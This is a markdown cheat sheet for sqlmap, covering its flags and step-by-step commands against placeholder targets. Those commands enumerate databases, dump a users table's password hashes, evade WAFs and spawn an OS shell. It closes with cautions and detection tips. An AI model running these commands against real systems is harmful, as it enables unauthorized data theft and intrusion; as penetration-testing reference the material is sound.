# SQLMap — Automated SQL Injection Detection & Exploitation

> **TL;DR:** `sqlmap` automates finding and exploiting SQL Injection vulnerabilities across MySQL, PostgreSQL, MSSQL, Oracle, and SQLite. It can enumerate databases, dump tables, read/write files, and even spawn OS shells.

---

## Installation & Availability
Pre-installed on Kali Linux.
```bash
sudo apt install -y sqlmap
```

---

## Essential Flags Reference

| Flag | Description |
|------|-------------|
| `-u "<url>"` | Target URL with query parameter (e.g., `http://target.local/item?id=1`) |
| `-r <req.txt>` | Load raw HTTP request saved from Burp Suite (best for `POST`, JSON, or authenticated endpoints) |
| `-p <param>` | Specify exact parameter(s) to test (e.g., `-p username` or `-p id`) |
| `--data="<body >"` | Send `POST` data string |
| `--cookie="<cookie>"` | Supply session cookie if not using `-r` |
| `--batch` | Never ask for user input; automatically pick default answers |
| `--level=1..5` | Depth of tests (default `1`; `2+` tests Cookies, `3+` tests User-Agent/Referer) |
| `--risk=1..3` | Payload risk (default `1`; `3` includes `OR`-based & heavy tests—use with caution) |
| `--dbs` | Enumerate all database names |
| `-D <db> --tables` | Enumerate tables inside database `<db>` |
| `-D <db> -T <table> --dump` | Dump all rows/columns from `<table>` |
| `--tamper=<script>` | Use tamper scripts (e.g., `space2comment,between`) to bypass basic WAFs |
| `--os-shell` | Attempt to spawn an interactive OS shell (requires high DB privileges) |
| `--flush-session` | Clear cached results for the target and rescan fresh |

---

## Step-by-Step Practical Workflows

### 1. Basic GET Parameter Enumeration
```bash
sqlmap -u "http://target.local/product.php?id=5" --batch --dbs
```

### 2. Testing Authenticated POST / JSON Endpoints via Burp Request (`-r`)
1. Capture the `POST /login` or `POST /api/search` request in Burp Suite.
2. Right-click -> **Save item** (or copy to `req.txt`).
3. Put a `*` marker where you want `sqlmap` to inject (optional), or specify `-p`:
```bash
sqlmap -r req.txt -p search_query --batch --dbs
```

### 3. Dumping Sensitive Tables
Once `--dbs` reveals a database (e.g., `webapp_db`):
```bash
# List tables
sqlmap -r req.txt -D webapp_db --tables --batch
# Dump the users table
sqlmap -r req.txt -D webapp_db -T users --dump --batch
```

### 4. Faster Extraction with Threads & Specific Columns
```bash
sqlmap -r req.txt -D webapp_db -T users -C username,password_hash --dump --threads=5 --batch
```

---

## Common Pitfalls & Defensive Notes
- **Never Run `--risk=3` Blindly on Production:** Heavy `UPDATE`/`OR` payloads can corrupt database records or crash the app. Stick to `--level=1..2 --risk=1` unless authorized.
- **Noisy Default User-Agent:** `sqlmap` sends `sqlmap/1.x` by default, which is instantly blocked by WAFs. Add `--random-agent` to use a realistic browser User-Agent.
- **Defensive Tip:** Use **parameterized queries (prepared statements)** in code—this completely neutralizes SQLi. In logs, alert on `sqlmap` User-Agents and bursts of `UNION SELECT` / `SLEEP(` / `WAITFOR DELAY`.
